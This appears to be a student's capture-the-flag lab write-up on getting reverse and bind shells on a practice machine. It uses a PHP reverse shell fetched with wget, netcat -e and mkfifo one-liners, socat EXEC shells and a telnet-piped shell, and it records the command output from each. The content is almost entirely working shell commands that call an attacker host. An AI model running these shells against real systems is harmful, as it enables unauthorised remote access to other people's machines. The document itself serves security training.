### Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
```
# Copied reverse shell to  current directory

cp /usr/share/webshells/php/php-reverse-shell.php .  

# Gave permission   
chmod 777 php-reverse-shell.php   

# Added own sysetm Ip and port to shell
vim php-reverse-shell.php 

# Started python server in the same directory
python3 -m http.server 8000

# Downloaded php shell in remote machine
wget http://10.13.95.14:8000/php-reverse-shell.php

# Started netcat in own machine
nc -nlvp 4444

# Executed shell
php php-reverse-shell.php.1

# Received shell on own machine
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.13.95.14] from (UNKNOWN) [10.201.91.172] 55220
Linux ip-10-201-91-172 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 16:30:19 up 11 min,  1 user,  load average: 0.04, 0.08, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shell    pts/0    10.13.95.14      16:19    3.00s  0.04s  0.04s -bash
uid=1000(shell) gid=1000(shell) groups=1000(shell),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(shell) gid=1000(shell) groups=1000(shell),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ whoami
shell

```

### Bind shell 3rd task
```
## Type 1
# Started nc amd opened port on remote machine
shell@ip-10-201-91-172:~$ nc 10.13.95.14 1234 -e /bin/bash

# Started nc on own machine
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.13.95.14] from (UNKNOWN) [10.201.91.172] 48092
ls
php-reverse-shell.php
php-reverse-shell.php.1
id
uid=1000(shell) gid=1000(shell) groups=1000(shell),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
whoami
shell

## Type 2

# Started nc on remote machine and specified the port
shell@ip-10-201-91-172:~$ mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
listening on [any] 4444 ...
connect to [10.201.91.172] from (UNKNOWN) [10.13.95.14] 34784

## Command explaination
The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

## Same command for reverse shell
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Started nc on own machine and mentioned Ip and port
nc 10.201.91.172 4444
ls
php-reverse-shell.php
php-reverse-shell.php.1
id^[[D
/bin/sh: 2: i: not found
id
uid=1000(shell) gid=1000(shell) groups=1000(shell),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
whoami
shell

```

### Socat for shell task04
```
## Reverse shell
# Started socat listener on own machine
socat TCP-L:5555 -  

# Syantax for target system
socat TCP:10.13.95.14:5555 EXEC:"bash -li"

# Received reverse shell
socat TCP-L:5555 -  
ls
php-reverse-shell.php
php-reverse-shell.php.1
whoami
shell
id
uid=1000(shell) gid=1000(shell) groups=1000(shell),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)

# Commands automatically executed on remote machine as we entered them on own machine
Cshell@ip-10-201-91-172:~$ socat TCP:10.13.95.14:5555 EXEC:"bash -li"
shell@ip-10-201-91-172:~$ ls
shell@ip-10-201-91-172:~$ whoami
shell@ip-10-201-91-172:~$ id

## Bind shell
# Synatx for target machine
socat TCP-L:8888 EXEC:"bash -li"

# Syantax for own machine
socat TCP:10.201.91.172:8888 - 

#Received shell on own machine
socat TCP:10.201.91.172:8888 -       
pwd
/home/shell
id 
uid=1000(shell) gid=1000(shell) groups=1000(shell),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
whoami
shell

```

### Reverse shell using telnet 
```
# In Attacker machine start two listeners:
nc -lvp 8080
nc -lvp 8081

# In Victime machine run below command:
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```
